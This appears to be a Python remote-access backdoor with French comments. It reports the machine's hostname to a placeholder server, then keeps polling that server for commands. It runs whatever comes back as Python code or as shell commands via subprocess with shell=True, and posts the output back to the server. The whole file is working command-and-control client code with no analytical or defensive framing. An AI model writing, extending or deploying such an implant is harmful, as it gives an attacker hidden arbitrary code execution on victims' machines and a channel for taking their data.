import requests
import subprocess
import socket
url_save_result = "https://ton_site/save_result.php"
url_save_connect = "https://ton_site/save_connect.php"
url_save_erreur = "https://ton_site/save_erreur.php"
url_get_command = "https://ton_site/commande.txt"
url_clear= "https://ton_site/clear.php"

try:
    connect = socket.gethostname()
    if connect:
        requests.post(url_save_connect,data={'connect': connect})
except:
    erreur = "echec lors de la connection"
    requests.post(url_save_erreur,data={'erreur': erreur})

while True:
    try:
        reponse = requests.get(url_get_command)
        commande = reponse.text
        print(commande)
        if commande:
            # verif python
            if commande.startswith("python "):
                # Extraire le code Python de la commande
                code_python = commande[len("python "):]
                try:
                    # executer le code
                    resultat = subprocess.run(['python', '-c', code_python], capture_output=True, text=True)
                    print(resultat.stdout)
                    requests.post(url_save_result, data={'resultat': resultat.stdout})
                    requests.post(url_clear)
                except:
                    # erreur
                    erreur = "erreur , code python mal formulé"
                    print(erreur)
                    requests.post(url_save_erreur, data={'resulat': erreur})
            # verif fonction
            elif commande.startswith("fonction "):
                fonction = commande[len("fonction "):]
                if fonction == "screen":
                    resultat = "screen"
                    print(resultat)
                    requests.post(url_save_result, data={'resultat': resultat})
                    requests.post(url_clear)
            # verif bash
            else:
                # La commande n'est pas une commande Python, exécute directement
                try:
                    resultat = subprocess.run(commande, shell=True, capture_output=True, text=True)
                    if resultat:
                        print(resultat.stdout)
                        requests.post(url_save_result, data={'resultat': resultat.stdout})
                        requests.post(url_clear)
                except:
                    erreur = "commande inconue"
                    print(erreur)
                    requests.post(url_save_erreur, data={'erreur': erreur})
    except:  
        erreur = "aucune commande"
        print(erreur)
    
